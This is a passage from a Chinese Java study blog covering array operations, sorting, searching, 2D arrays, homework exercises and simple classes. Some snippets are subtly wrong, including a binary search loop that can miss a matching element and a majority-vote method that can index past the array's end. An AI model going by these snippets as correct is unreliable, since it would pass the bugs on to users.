class="keyword">return</span> b.append(<span class="string">&#x27;]&#x27;</span>).toString();</span><br><span class="line">            b.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> toString(array);</span><br><span class="line">        String ret2= toString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 =  arr;<span class="comment">//这不算拷贝，没有新的内存空间</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr3[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        System.out.println(Arrays.toString(arr2));</span><br><span class="line">        <span class="comment">//扩容2倍</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = Arrays.copyOf(arr, arr.length * <span class="number">2</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] arr4 = Arrays.copyOfRange(arr, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr4));</span><br><span class="line">        <span class="type">int</span>[] arr5 = arr.clone();</span><br><span class="line">        System.out.println(Arrays.toString(arr5));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="求平均值"><a href="#求平均值" class="headerlink" title="求平均值"></a>求平均值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">avg</span><span class="params">(<span class="type">int</span> arr[])</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x : arr) &#123;</span><br><span class="line">            sum += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum * <span class="number">1.0</span> / arr.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span> ,<span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        System.out.println(avg(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="找下标"><a href="#找下标" class="headerlink" title="找下标"></a>找下标</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">find1</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &lt; key) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; key) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">8</span> ,<span class="number">3</span>, <span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    Arrays.sort(arr);<span class="comment">//快排,升序，降序需要比较器，没学;</span></span><br><span class="line">    <span class="comment">//也可以用Arrays.binarySearch()</span></span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">    System.out.println(binarySearch(arr, <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="复习下冒泡"><a href="#复习下冒泡" class="headerlink" title="复习下冒泡"></a>复习下冒泡</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; len - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                    arr[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>优化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubblesort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                arr[j] = arr[j +  <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                flg =<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flg == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    bubblesort(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组逆序"><a href="#数组逆序" class="headerlink" title="数组逆序"></a>数组逆序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    reverse(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fla</span> <span class="operator">=</span> Arrays.equals(arr, arr2);</span><br><span class="line">    System.out.println(fla);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="批量初始化"><a href="#批量初始化" class="headerlink" title="批量初始化"></a>批量初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">    Arrays.fill(arr, <span class="number">2</span>, <span class="number">5</span>, -<span class="number">1</span>);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//不规则数组,没指定列arr[0]是null</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][];</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">            System.out.print(arr[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span>[] arr1: arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.println(Arrays.toString(arr));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));<span class="comment">//一维数组</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.deepToString(arr));<span class="comment">//[[0, 0, 0], [0, 0, 0]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr3 = &#123;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>&#125;,&#123;<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组中是否存在三个连续的奇数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">func5</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (count ==<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    System.out.println(func5(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多数元素leecode169</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    Arrays.sort(arr);</span><br><span class="line">    <span class="keyword">return</span> arr[arr.length/<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//投票法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">majorityElement2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == ret) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            ret = arr[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    System.out.println(majorityElement2(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一个数组，进有一个元素出现一次，其它都出现俩次</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        ret = ret ^ arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    System.out.println(func4(arr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] funca(<span class="type">int</span>[] arr, <span class="type">int</span> target) &#123;</span><br><span class="line">    <span class="type">int</span>[] ret = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] + arr[j] == target) &#123;</span><br><span class="line">                ret[<span class="number">0</span>] = i;</span><br><span class="line">                ret[<span class="number">1</span>] = j;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//奇数位于偶数之前</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    func(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">transform1</span><span class="params">(<span class="type">int</span>[] a)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        a[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] transform(<span class="type">int</span>[] a) &#123;</span><br><span class="line">    <span class="type">int</span>[] tmpArr = <span class="keyword">new</span> <span class="title class_">int</span>[a.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        tmpArr[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmpArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] ret = transform(a);<span class="comment">//a不变</span></span><br><span class="line">    System.out.println(Arrays.toString(ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//行为（方法）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类名 大驼峰</span></span><br><span class="line"><span class="comment">//方法名 小驼峰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WashJi</span> &#123;</span><br><span class="line">    <span class="comment">//属性[字段]---》成员属性</span></span><br><span class="line">    <span class="keyword">public</span> String brand;    <span class="comment">//品牌</span></span><br><span class="line">    <span class="keyword">public</span> String type;     <span class="comment">//型号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> weight;   <span class="comment">//重量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> length;   <span class="comment">//长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> width;   <span class="comment">//宽</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> height;   <span class="comment">//高</span></span><br><span class="line">    <span class="keyword">public</span> String color;   <span class="comment">//颜色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//行为[方法]----》成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">WashJi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;洗衣功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dryClothes</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;脱水功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTime</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String color;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wag</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;摇尾巴&quot;</span>  );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(String ret)</span> &#123;</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实例化一个对象</span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.name=<span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        dog.wag();</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog2.name = <span class="string">&quot;ximu&quot;</span>;</span><br><span class="line">        dog2.wag();</span><br><span class="line">        <span class="type">String</span> <span 